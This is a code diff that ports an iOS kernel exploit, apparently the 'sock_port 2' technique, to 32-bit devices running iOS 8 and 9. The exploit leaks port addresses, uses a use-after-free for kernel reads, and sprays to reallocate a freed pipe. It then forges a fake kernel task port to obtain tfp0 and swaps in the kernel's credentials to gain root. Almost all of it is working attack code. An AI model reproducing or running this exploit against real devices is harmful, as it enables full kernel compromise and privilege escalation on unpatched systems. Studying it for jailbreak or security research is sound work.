@@ -7,14 +7,15 @@
 #include <pthread.h>
 #include <sys/types.h>
 #include <netinet/in.h>
-#include <IOKit/IOKitLib.h>
+#include <unistd.h>
+#include "../IOKit/IOKitLib.h"
 
-#include <plog.h>
-#include <sockpuppet.h>
-#include <common.h>
-#include <io.h>
-#include <kernel.h>
-#include <offsets.h>
+#include "plog.h"
+#include "sockpuppet.h"
+#include "common.h"
+#include "io.h"
+#include "kernel.h"
+#include "offsets.h"
 
 static inline uint32_t mach_port_waitq_flags(void)
 {
@@ -161,13 +162,8 @@ retry:
         getMinMtu(socket, &mtu);
         getPreferTempAddr(socket, &preferTempAddr);
         
-#ifdef __LP64__
-        addr_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)preferTempAddr & 0x00000000ffffffff);
-        if (mtu >= 0xffffff00 && mtu != 0xffffffff && preferTempAddr != 0xdeadbeef)
-#else
         addr_t ptr = mtu;
         if (mtu != 0xffffffff && mtu != 0 && preferTempAddr != 0xdeadbeef && mtu == preferTempAddr)
-#endif
         {
             DEVLOG2("leakPortAddress: success (attempts: %d/%d, retries: %d/%d)", i, MAX_PORTLEAK_ATTEMPTS, retry, MAX_PORTLEAK_RETRY);
             mach_port_destroy(mach_task_self(), holder);
@@ -196,11 +192,7 @@ retry:
 static int leak20AndFree(addr_t addr, bool do_kfree, void** retval)
 {
     int offset = 0;
-#ifdef __LP64__
-    offset = 164;
-#else
     offset = 116;
-#endif
     
     int sockets[128];
     for (int i = 0; i < 128; i++)
@@ -357,11 +349,7 @@ earlyread64_end:
 
 static int earlyReadPtr(addr_t addr, addr_t* retval)
 {
-#ifdef __LP64__
-    return earlyRead64(addr, retval);
-#else
     return earlyRead32(addr, retval);
-#endif
 }
 
 static mach_port_t createNewPort(void)
@@ -400,20 +388,20 @@ goto kern_fail;\
     addr_t itk_space = 0;
     addr_t is_table = 0;
     
-    err = kreadptr_sp(self_port_addr + IPC_PORT_IP_KOBJECT, &task_addr);
+    err = kreadptr_sp(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), &task_addr);
     CHECK_FIND_PORT_RET(kreadptr, task_addr, err);
     DEVLOG("task_addr: " ADDR, task_addr);
     
-    err = kreadptr_sp(task_addr + TASK_ITK_SPACE, &itk_space);
+    err = kreadptr_sp(task_addr + koffset(TASK_ITK_SPACE), &itk_space);
     CHECK_FIND_PORT_RET(kreadptr, itk_space, err);
     DEVLOG("itk_space: " ADDR, itk_space);
     
-    err = kreadptr_sp(itk_space + IPC_SPACE_IS_TABLE, &is_table);
+    err = kreadptr_sp(itk_space + koffset(IPC_SPACE_IS_TABLE), &is_table);
     CHECK_FIND_PORT_RET(kreadptr, is_table, err);
     DEVLOG("is_table: " ADDR, is_table);
     
     uint32_t port_index = port >> 8;
-    const int sizeof_ipc_entry_t = IPC_ENTRY_SIZE;
+    const int sizeof_ipc_entry_t = koffset(IPC_ENTRY_SIZE);
     
     if(cleanup)
     {
@@ -438,7 +426,7 @@ kern_fail:
 mach_port_t exploit(addr_t* kslide)
 {
     kern_return_t err = KERN_SUCCESS;
-    
+
 #define CHECK_KERN_RET(func, addr, err) {\
 if(err != KERN_SUCCESS) \
 { \
@@ -446,13 +434,14 @@ ERR("%s failed: %s (%s)", #func, #addr, mach_error_string(err)); \
 goto fail;\
 } \
 }
-    
+
+    offsets_init();
+
     LOG_("exploiting sock_port_2 legacy");
-    
+
     int port_pointer_overwrite_pipe[2];
     int fake_port_pipe[2] = {-1, -1};
-    kport_t *fake_port = NULL;
-    
+
     // get its kernel address
     DEVLOG("creating dummy task port");
     mach_port_t dummy_task_port = createNewPort();
@@ -462,7 +451,7 @@ goto fail;\
         goto fail;
     }
     DEVLOG("dummy_task_port: %d", dummy_task_port);
-    
+
     // self_port_addr
     LOG_("leaking port address");
     addr_t self_port_addr = 0;
@@ -480,7 +469,7 @@ goto fail;\
         goto fail;
     }
     DEVLOG("self_port_addr: " ADDR, self_port_addr);
-    
+
     addr_t tfp0_port_addr = 0;
     for (int i = 0; i < MAX_PORTLEAK_ATTEMPTS; i++)
     {
@@ -496,10 +485,10 @@ goto fail;\
         goto fail;
     }
     DEVLOG("dummy kernel_task_port_addr: " ADDR, tfp0_port_addr);
-    
-    
+
+
     // early kread with leak20 primitive
-    
+
 #define CHECK_EARLY_READ(val) {\
 if(!val) \
 { \
@@ -511,12 +500,12 @@ else \
 DEVLOG("%s: " ADDR, #val, val); \
 } \
 }
-    
+
     LOG_("reading kernel memory (UaF)");
     addr_t ipc_space_kernel = 0;
-    earlyReadPtr(self_port_addr + IPC_PORT_IP_RECEIVER, &ipc_space_kernel);
+    earlyReadPtr(self_port_addr + koffset(IPC_PORT_IP_RECEIVER), &ipc_space_kernel);
     CHECK_EARLY_READ(ipc_space_kernel);
-    
+
     DEVLOG("creating pipe");
     err = pipe(port_pointer_overwrite_pipe);
     if(err)
@@ -524,23 +513,17 @@ DEVLOG("%s: " ADDR, #val, val); \
         ERR("failed to create port_pointer_overwrite_pipe");
         goto fail;
     }
-    
-#ifdef __LP64__
-    static const size_t pipebuf_size = 0x10000;
-    size_t pipebuf_sizep = 0x10000;
-#else
+
     static const size_t pipebuf_size = 0x8000;
     size_t pipebuf_sizep = 0x10000;
-#endif
     static uint8_t pipebuf[pipebuf_size];
     memset(pipebuf, 0, pipebuf_size);
     *(addr_t*)(pipebuf) = pipebuf_sizep;
-    
+
     write(port_pointer_overwrite_pipe[1], pipebuf, pipebuf_size);
     read(port_pointer_overwrite_pipe[0], pipebuf, pipebuf_size);
     write(port_pointer_overwrite_pipe[1], pipebuf, sizeof(addr_t));
-    
-#ifndef __LP64__
+
     /* There are no PAN devices on aarch64 & ios 9 */
     /* but we have still 32bit */
     err = pipe(fake_port_pipe);
@@ -549,42 +532,51 @@ DEVLOG("%s: " ADDR, #val, val); \
         ERR("failed to create fake_port_pipe");
         goto fail;
     }
-#endif
-    
-    
-#ifdef __LP64__
-    size_t fake_task_size = 0x600;
-#else
+
     size_t fake_task_size = 0x208;
-#endif
+    size_t fake_port_size = is_ios9 ? sizeof(kport9_t) : sizeof(kport8_t);
     DEVLOG("allocating fake_port");
-    fake_port = malloc(sizeof(kport_t) + fake_task_size);
-    if(!fake_port)
-    {
-        ERR("faild to allocate fake_port");
+
+    kport_t *fake_port = NULL;
+
+    fake_port = malloc(fake_port_size + fake_task_size);
+    if (!fake_port) {
+        ERR("failed to allocate fake_port");
         goto fail;
     }
-    ktask_t *fake_task = (ktask_t *)((addr_t)fake_port + sizeof(kport_t));
-    bzero((void *)fake_port, sizeof(kport_t) + fake_task_size);
-    
+
+    ktask_t *fake_task = (ktask_t *)((addr_t)fake_port + fake_port_size);
+    bzero((void *)fake_port, fake_port_size + fake_task_size);
+
     fake_task->ref_count = 0xff;
-    
-    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
-    fake_port->ip_references = 0xf00d;
-    fake_port->ip_lock.type = 0x11;
-    fake_port->ip_messages.port.receiver_name = 1;
-    fake_port->ip_messages.port.msgcount = 0;
-    fake_port->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
-    fake_port->ip_messages.port.waitq.flags = mach_port_waitq_flags();
-    fake_port->ip_srights = 99;
-    fake_port->ip_kobject = 0;
-    fake_port->ip_receiver = ipc_space_kernel;
-    
-#ifndef __LP64__
-    write(fake_port_pipe[1], (void *)fake_port, sizeof(kport_t) + fake_task_size);
-    read(fake_port_pipe[0], (void *)fake_port, sizeof(kport_t) + fake_task_size);
-#endif
-    
+
+    if (is_ios9) {
+        fake_port->kport9.ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
+        fake_port->kport9.ip_references = 0xf00d;
+        fake_port->kport9.ip_lock.type = 0x11;
+        fake_port->kport9.ip_messages.port.receiver_name = 1;
+        fake_port->kport9.ip_messages.port.msgcount = 0;
+        fake_port->kport9.ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
+        fake_port->kport9.ip_messages.port.waitq.flags = mach_port_waitq_flags();
+        fake_port->kport9.ip_srights = 99;
+        fake_port->kport9.ip_kobject = 0;
+        fake_port->kport9.ip_receiver = ipc_space_kernel;
+    } else {
+        fake_port->kport8.ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
+        fake_port->kport8.ip_references = 0xf00d;
+        fake_port->kport8.ip_lock.type = 0x11;
+        fake_port->kport8.ip_messages.port.receiver_name = 1;
+        fake_port->kport8.ip_messages.port.msgcount = 0;
+        fake_port->kport8.ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
+        fake_port->kport8.ip_messages.port.waitq.flags = mach_port_waitq_flags();
+        fake_port->kport8.ip_srights = 99;
+        fake_port->kport8.ip_kobject = 0;
+        fake_port->kport8.ip_receiver = ipc_space_kernel;
+    }
+
+    write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size);
+    read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size);
+
     addr_t task_addr = 0;
     addr_t proc = 0;
     addr_t fds = 0;
@@ -593,59 +585,58 @@ DEVLOG("%s: " ADDR, #val, val); \
     addr_t fglob = 0;
     addr_t fg_data = 0;
     addr_t pipe_buffer = 0;
-    
+
     LOG_("reading kernel memory (UaF)");
-    earlyReadPtr(self_port_addr + IPC_PORT_IP_KOBJECT, &task_addr);
+    earlyReadPtr(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), &task_addr);
     CHECK_EARLY_READ(task_addr);
-    
-    earlyReadPtr(task_addr + TASK_BSDINFO, &proc);
+
+    earlyReadPtr(task_addr + koffset(TASK_BSDINFO), &proc);
     CHECK_EARLY_READ(proc);
-    
-    earlyReadPtr(proc + PROC_P_FD, &fds);
+
+    earlyReadPtr(proc + koffset(PROC_P_FD), &fds);
     CHECK_EARLY_READ(fds);
-    
-    earlyReadPtr(fds + FILEDESC_FD_OFILES, &ofiles);
+
+    earlyReadPtr(fds + koffset(FILEDESC_FD_OFILES), &ofiles);
     CHECK_EARLY_READ(ofiles);
-    
+
     earlyReadPtr(ofiles + port_pointer_overwrite_pipe[0] * sizeof(addr_t), &fproc);
     CHECK_EARLY_READ(fproc);
-    
-    earlyReadPtr(fproc + FILEPROC_F_FGLOB, &fglob);
+
+    earlyReadPtr(fproc + koffset(FILEPROC_F_FGLOB), &fglob);
     CHECK_EARLY_READ(fglob);
-    
-    earlyReadPtr(fglob + FILEGLOB_FG_DATA, &fg_data);
+
+    earlyReadPtr(fglob + koffset(FILEGLOB_FG_DATA), &fg_data);
     CHECK_EARLY_READ(fg_data);
-    
-    earlyReadPtr(fg_data + PIPE_BUFFER, &pipe_buffer);
+
+    earlyReadPtr(fg_data + koffset(PIPE_BUFFER), &pipe_buffer);
     CHECK_EARLY_READ(pipe_buffer);
-    
-#ifndef __LP64__
+
     addr_t port_fproc = 0;
     addr_t port_fglob = 0;
     addr_t port_fg_data = 0;
     addr_t fake_port_buffer = 0;
-    
+
     fproc = earlyReadPtr(ofiles + fake_port_pipe[0] * sizeof(addr_t), &port_fproc);
     CHECK_EARLY_READ(port_fproc);
-    
-    earlyReadPtr(port_fproc + FILEPROC_F_FGLOB, &port_fglob);
+
+    earlyReadPtr(port_fproc + koffset(FILEPROC_F_FGLOB), &port_fglob);
     CHECK_EARLY_READ(port_fglob);
-    
-    earlyReadPtr(port_fglob + FILEGLOB_FG_DATA, &port_fg_data);
+
+    earlyReadPtr(port_fglob + koffset(FILEGLOB_FG_DATA), &port_fg_data);
     CHECK_EARLY_READ(port_fg_data);
-    
-    earlyReadPtr(port_fg_data + PIPE_BUFFER, &fake_port_buffer);
+
+    earlyReadPtr(port_fg_data + koffset(PIPE_BUFFER), &fake_port_buffer);
     CHECK_EARLY_READ(fake_port_buffer);
-#endif
 
     // Fix ip_kobject.
-#ifdef __LP64__
-    fake_port->ip_kobject = (addr_t)fake_task;
-#else
-    fake_port->ip_kobject = fake_port_buffer + sizeof(kport_t);
-    write(fake_port_pipe[1], (void *)fake_port, sizeof(kport_t) + fake_task_size);
-#endif
-    
+    if (is_ios9) {
+        fake_port->kport9.ip_kobject = fake_port_buffer + fake_port_size;
+        write(fake_port_pipe[1], (void *)&(fake_port->kport9), fake_port_size + fake_task_size);
+    } else {
+        fake_port->kport8.ip_kobject = fake_port_buffer + fake_port_size;
+        write(fake_port_pipe[1], (void *)&(fake_port->kport8), fake_port_size + fake_task_size);
+    }
+
     // Free the first pipe.
     int isfree = -1;
     LOG_("free the first pipe");
@@ -663,7 +654,7 @@ DEVLOG("%s: " ADDR, #val, val); \
         ERR("kfree failed");
         goto fail;
     }
-    
+
     LOG_("spraying");
     mach_port_t holder = MACH_PORT_NULL;
     addr_t leak = 0;
@@ -674,7 +665,7 @@ DEVLOG("%s: " ADDR, #val, val); \
         {
             goto fail;
         }
-        
+
         read(port_pointer_overwrite_pipe[0], &leak, sizeof(addr_t));
         if (leak == tfp0_port_addr)
         {
@@ -685,26 +676,22 @@ DEVLOG("%s: " ADDR, #val, val); \
         mach_port_destroy(mach_task_self(), holder);
         holder = MACH_PORT_NULL;
     }
-    
+
     if (leak != tfp0_port_addr)
     {
         ERR("failed to reallocate");
         // panic
         goto fail;
     }
-    
+
     if (!holder)
     {
         ERR("failed to spraying");
         goto fail;
     }
-    
-#ifdef __LP64__
-    write(port_pointer_overwrite_pipe[1], &fake_port, sizeof(addr_t));
-#else
+
     write(port_pointer_overwrite_pipe[1], &fake_port_buffer, sizeof(addr_t));
-#endif
-    
+
     struct ool_msg *msg = malloc(0x1000);
     err = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, holder, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if (err)
@@ -713,18 +700,19 @@ DEVLOG("%s: " ADDR, #val, val); \
         free(msg);
         goto fail;
     }
-    
+
     mach_port_t *received_ports = msg->ool_ports.address;
     mach_port_t pipe_fake_task_port = received_ports[0]; // fake port
     free(msg);
-    
+
     DEVLOG("pipe_fake_task_port: %x", pipe_fake_task_port);
-    
-    addr_t *read_addr_ptr = (addr_t *)((addr_t)fake_task + TASK_BSDINFO);
- 
-#ifdef __LP64__
+
+    addr_t *read_addr_ptr = (addr_t *)((addr_t)fake_task + koffset(TASK_BSDINFO));
+
 # define stage1Read32(addr, val) { \
-   *read_addr_ptr = addr - BSDINFO_PID; \
+   read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size); \
+   *read_addr_ptr = addr - koffset(BSDINFO_PID); \
+   write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size); \
    val = 0x0; \
    err = pid_for_task(pipe_fake_task_port, (int *)&val); \
    if(err != KERN_SUCCESS) { \
@@ -732,106 +720,78 @@ DEVLOG("%s: " ADDR, #val, val); \
      goto fail; \
    } \
  }
-#else
-# define stage1Read32(addr, val) { \
-   read(fake_port_pipe[0], (void *)fake_port, sizeof(kport_t) + fake_task_size); \
-   *read_addr_ptr = addr - BSDINFO_PID; \
-   write(fake_port_pipe[1], (void *)fake_port, sizeof(kport_t) + fake_task_size); \
-   val = 0x0; \
-   err = pid_for_task(pipe_fake_task_port, (int *)&val); \
-   if(err != KERN_SUCCESS) { \
-     ERR("stage 1 read failed (%s)", mach_error_string(err)); \
-     goto fail; \
-   } \
- }
-#endif
-    
+
 #define stage1Read64(addr, val) {\
   uint32_t r64_tmp; \
   stage1Read32(addr + 0x4, r64_tmp);\
   stage1Read32(addr, val);\
   val = val | ((uint64_t)r64_tmp << 32); \
 }
-    
-#ifdef __LP64__
-# define stage1ReadPtr(addr, val) stage1Read64(addr, val)
-#else
+
 # define stage1ReadPtr(addr, val) stage1Read32(addr, val)
-#endif
-    
+
     LOG_("reading kernel memory (stage1)");
     addr_t struct_task;
-    stage1ReadPtr(self_port_addr + IPC_PORT_IP_KOBJECT, struct_task);
+    stage1ReadPtr(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), struct_task);
     DEVLOG("struct_task: " ADDR, struct_task);
-    
+
     if (struct_task != task_addr)
     {
         ERR("stage1 read failed: (%s)", "struct_task == 0");
         goto fail;
     }
     DEVLOG("stage1 read succeeded");
-    
+
     // findout some offsets
     addr_t bsd_info = 0;
     addr_t kernel_task_addr = 0;
     addr_t kernel_vm_map = 0;
     uint32_t pid = 0;
     addr_t tmp_task_addr = struct_task;
-    
+
     while(tmp_task_addr != 0)
     {
-        stage1ReadPtr(tmp_task_addr + TASK_BSDINFO, bsd_info);
+        stage1ReadPtr(tmp_task_addr + koffset(TASK_BSDINFO), bsd_info);
         if(!bsd_info)
         {
             ERR("stage1 read failed: (%s)", "bsd_info == 0");
             goto fail;
         }
-        stage1Read32(bsd_info + BSDINFO_PID, pid);
+        stage1Read32(bsd_info + koffset(BSDINFO_PID), pid);
         if (pid == 0)
         {
-#ifndef __LP64__
-            stage1ReadPtr(tmp_task_addr + TASK_VM_MAP, kernel_vm_map);
+            stage1ReadPtr(tmp_task_addr + koffset(TASK_VM_MAP), kernel_vm_map);
             if(!kernel_vm_map)
             {
                 ERR("stage1 read failed: (%s)", "kernel_vm_map == 0");
                 goto fail;
             }
-#endif
             kernel_task_addr = tmp_task_addr;
             break;
         }
-        stage1ReadPtr(tmp_task_addr + TASK_PREV, tmp_task_addr);
+        stage1ReadPtr(tmp_task_addr + koffset(TASK_PREV), tmp_task_addr);
     }
-    
-#ifndef __LP64__
-    DEVLOG("kernel_vm_map: " ADDR, kernel_vm_map);
-#endif
+
     DEVLOG("kernel_task_addr: " ADDR, kernel_task_addr);
 
     mach_port_t new_port = MACH_PORT_NULL;
-    
-#ifdef __LP64__
-    // haxx!
-    fake_port->ip_kobject = kernel_task_addr;
-    LOG_("getting real kernel_task");
-    err = task_get_special_port(pipe_fake_task_port, 1, &tfp0_sp);
-#else
+
     // building incomplete fake_task
     LOG_("creating incomplete fake task port");
-    read(fake_port_pipe[0], (void *)fake_port, sizeof(kport_t) + fake_task_size);
-    
+    read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size);
+
     fake_task->lock.data = 0x0;
     fake_task->lock.type = 0x22;
     fake_task->ref_count = 100;
     fake_task->active = 1;
-    *(addr_t*)((addr_t)fake_task + TASK_VM_MAP) = kernel_vm_map;
-    *(uint32_t*)((addr_t)fake_task + TASK_ITK_SELF) = 1;
-    
-    write(fake_port_pipe[1], (void *)fake_port, sizeof(kport_t) + fake_task_size);
-    
+    *(addr_t*)((addr_t)fake_task + koffset(TASK_VM_MAP)) = kernel_vm_map;
+    *(uint32_t*)((addr_t)fake_task + koffset(TASK_ITK_SELF)) = 1;
+
+    write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size);
+
     // incomplete tfp0
     tfp0_sp = pipe_fake_task_port;
-    
+
     // building 2nd incomplete fake_port
     new_port = createNewPort();
     if(!new_port)
@@ -839,130 +799,113 @@ DEVLOG("%s: " ADDR, #val, val); \
         ERR("port allocation failed");
         goto fail;
     }
-    
+
     LOG_("reading kernel memory (incomplete tfp0)");
     addr_t new_port_addr = 0;
     err = find_port_tfp0_sp(new_port, self_port_addr, false, &new_port_addr);
     CHECK_KERN_RET(find_port_tfp0_sp, new_port_addr, err);
     DEVLOG("new_port_addr: " ADDR, new_port_addr);
-    
+
     addr_t faketask = 0;
     err = kalloc_sp(&faketask, fake_task_size);
     CHECK_KERN_RET(kalloc_sp, faketask, err);
     DEVLOG("faketask: " ADDR, faketask);
-    
+
     // copying real ktask
     err = copyin_sp(fake_task, kernel_task_addr, fake_task_size);
     CHECK_KERN_RET(copyin, fake_task, err);
-    
+
     err = copyout_sp(faketask, (void*)fake_task, fake_task_size);
     CHECK_KERN_RET(copyout, fake_task, err);
-    
-    fake_port->ip_kobject = faketask;
-    
+
     // copying fake port
-    copyout_sp(new_port_addr, (void*)fake_port, sizeof(kport_t));
+    if (is_ios9) {
+        fake_port->kport9.ip_kobject = faketask;
+        copyout_sp(new_port_addr, (void*)&(fake_port->kport9), fake_port_size);
+    } else {
+        fake_port->kport8.ip_kobject = faketask;
+        copyout_sp(new_port_addr, (void*)&(fake_port->kport8), fake_port_size);
+    }
     CHECK_KERN_RET(copyout, fake_port, err);
-    
+
     LOG_("getting real kernel_task");
     err = task_get_special_port(new_port, 1, &tfp0_sp);
-#endif
-    
+
     CHECK_KERN_RET(task_get_special_port, tfp0_sp, err);
-    
+
     LOG_("tfp0: %x", tfp0_sp);
-    
+
     DEVLOG("exploit succeeded, cleaning up");
     err = find_port_tfp0_sp(pipe_fake_task_port, self_port_addr, true, NULL);
     CHECK_KERN_RET(find_port_tfp0_sp, NULL, err);
-    
-    err = kwriteptr_sp(fg_data + PIPE_BUFFER, 0);
-    CHECK_KERN_RET(kwriteptr, fg_data + PIPE_BUFFER, err);
-    
-#ifndef __LP64__
+
+    err = kwriteptr_sp(fg_data + koffset(PIPE_BUFFER), 0);
+    CHECK_KERN_RET(kwriteptr, fg_data + koffset(PIPE_BUFFER), err);
+
     err = find_port_tfp0_sp(new_port, self_port_addr, true, NULL);
     CHECK_KERN_RET(find_port_tfp0_sp, NULL, err);
-#endif
-    
+
     if (port_pointer_overwrite_pipe[0] > 0)  close(port_pointer_overwrite_pipe[0]);
     if (port_pointer_overwrite_pipe[1] > 0)  close(port_pointer_overwrite_pipe[1]);
     if (fake_port_pipe[0] > 0)  close(fake_port_pipe[0]);
     if (fake_port_pipe[1] > 0)  close(fake_port_pipe[1]);
     if (fake_port) free((void *)fake_port);
-    
+
     LOG_("cleaning up done");
-    
-#ifndef __LP64__
+
     err = kfree_sp(faketask, fake_task_size);
     CHECK_KERN_RET(kfree_sp, faketask, err);
-#endif
-    
+
     LOG_("leaking kernel anchor");
     addr_t anchor = 0;
     if(!leak_anchor(&anchor))
     {
         DEVLOG("anchor: " ADDR, anchor);
         addr_t kernel_base = 0;
-#ifdef __LP64__
-        kernel_base = (anchor & 0xfffffffffff00000) + KBASE_OFFSET;
-        for(uint32_t val = 0; 1; kernel_base -= 0x100000)
-        {
-            err = kread32_sp(kernel_base, &val);
-            CHECK_KERN_RET(kread32, kernel_base, err);
-            if(val == MH_MAGIC_64)
-            {
-                break;
-            }
-        }
-#else
         kernel_base = (anchor & 0xFFF00000) + 0x1000;
-#endif
         DEVLOG("kernel base: " ADDR, kernel_base);
-        *kslide = kernel_base - KERNEL_BASE_ADDRESS;
-        LOG_("kernel slide: " ADDR, *kslide);
+        //*kslide = kernel_base - KERNEL_BASE_ADDRESS;
+        //LOG_("kernel slide: " ADDR, *kslide);
+        *kslide = kernel_base;
     }
     else
     {
         ERR("failed to determining kernel base");
         goto fail;
     }
-    
-#ifndef NOROOT
-#ifdef APP
+
     LOG_("getting root");
     addr_t kern_proc_addr = 0;
     addr_t kern_kauth_cred_addr = 0;
     addr_t our_cred_addr = 0;
-    
-    err = kreadptr_sp(kernel_task_addr + TASK_BSDINFO, &kern_proc_addr);
+
+    err = kreadptr_sp(kernel_task_addr + koffset(TASK_BSDINFO), &kern_proc_addr);
     CHECK_KERN_RET(kreadptr_sp, kern_proc_addr, err);
-    
-    err = kreadptr_sp(kern_proc_addr + BSDINFO_KAUTH_CRED, &kern_kauth_cred_addr);
+
+    err = kreadptr_sp(kern_proc_addr + koffset(BSDINFO_KAUTH_CRED), &kern_kauth_cred_addr);
     CHECK_KERN_RET(kreadptr_sp, kern_kauth_cred_addr, err);
-    
-    err = kreadptr_sp(proc + BSDINFO_KAUTH_CRED, &our_cred_addr);
+
+    err = kreadptr_sp(proc + koffset(BSDINFO_KAUTH_CRED), &our_cred_addr);
     CHECK_KERN_RET(kreadptr_sp, our_cred_addr, err);
 
-    extern addr_t myProc;
-    extern addr_t myUcred;
+    addr_t myProc;
+    addr_t myUcred;
     myProc = proc;
     myUcred = our_cred_addr;
-    
-    err = kwriteptr_sp(proc + BSDINFO_KAUTH_CRED, kern_kauth_cred_addr);
-    CHECK_KERN_RET(kwriteptr_sp, proc + BSDINFO_KAUTH_CRED, err);
-    
+
+    err = kwriteptr_sp(proc + koffset(BSDINFO_KAUTH_CRED), kern_kauth_cred_addr);
+    CHECK_KERN_RET(kwriteptr_sp, proc + koffset(BSDINFO_KAUTH_CRED), err);
+
     setuid(0); // update host port, security token and whatnot
     LOG_("uid: %u", getuid());
-#endif
-#endif
-    
+
     extern addr_t self_port_address;
     self_port_address = self_port_addr;
-    
+
     LOG_("exploit done!");
-    
+
     return tfp0_sp;
-    
+
 fail:
     ERR("exploit failed, cleaning up");
     if (port_pointer_overwrite_pipe[0] > 0)  close(port_pointer_overwrite_pipe[0]);
